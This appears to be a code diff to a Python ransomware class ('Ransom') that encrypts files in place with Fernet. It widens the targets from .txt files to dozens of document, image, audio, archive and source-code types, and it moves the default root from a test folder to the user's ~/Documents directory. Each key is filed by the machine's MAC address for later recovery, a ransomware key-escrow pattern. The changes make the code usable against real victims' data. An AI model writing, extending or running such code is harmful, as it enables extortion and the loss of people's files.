@@ -18,7 +18,10 @@ class Ransom:
         else:
             self.key = Fernet.generate_key()
         self.fernet = Fernet(self.key)
-        self.targets = ['txt']
+        self.targets = ['txt', 'doc', 'docx', 'pdf', 'tex', 'csv' ,'xls', 'xlsx', 
+                        'xlsm', 'mp3', 'midi', 'mp4', 'zip', 'xml', 'html', 'css', 
+                        'png', 'jpg', 'jpeg', 'svg', 'gif', 'ico', 'ppt', 'pptx', 
+                        'java', 'c', 'cpp', 'js']
         if root == None:
             self.root = self.getDefaultRoot()
         else:
@@ -27,7 +30,9 @@ class Ransom:
         self.keyManager = KeyManager()
     
     def getDefaultRoot(self):
-        path = os.path.realpath('testDIr')
+        #path = os.path.abspath('Documents')
+        path = os.path.expanduser("~")+'/Documents'
+        print(path)
         #parts = path.split('/')
         #path = '/'.join(parts[:-1])
         #path+='/testDIr/'
@@ -41,8 +46,7 @@ class Ransom:
                     self.encryptFile(filePath)
             #for name in dirs:
                # print(os.path.join(root, name))
-        s = str(self.key)[2:-1]
-        self.keyManager.insertKey(get_mac(), s)
+        self.keyManager.insertKey(get_mac(), self.key)
 
     def encryptFile(self, file):
         with open(file, 'rb+') as f:
@@ -53,9 +57,7 @@ class Ransom:
             f.truncate()
 
     def startDecryption(self):
-        self.key = bytes(self.keyManager.getKey(get_mac()).encode())
-
-        self.fernet = Fernet(self.key)
+        self.key = self.keyManager.getKey(get_mac())
         if self.key == '':
             raise ValueError('The key is empty. Cannot decrypt without a key')
             print('No key') ### TODO díla við þetta
@@ -63,8 +65,6 @@ class Ransom:
         
         self.decrypt()
     
-
-
     def decrypt(self):
         for root, dirs, files in os.walk(self.root):
             for file in files:
@@ -135,10 +135,3 @@ else: #Encrypt is default
 
 """
         
-path = os.path.realpath('ransom.py')
-print(path)
-parts = path.split('/')
-path = '/'.join(parts[:-1])
-path+='/testDIr/'
-print(path)
-    
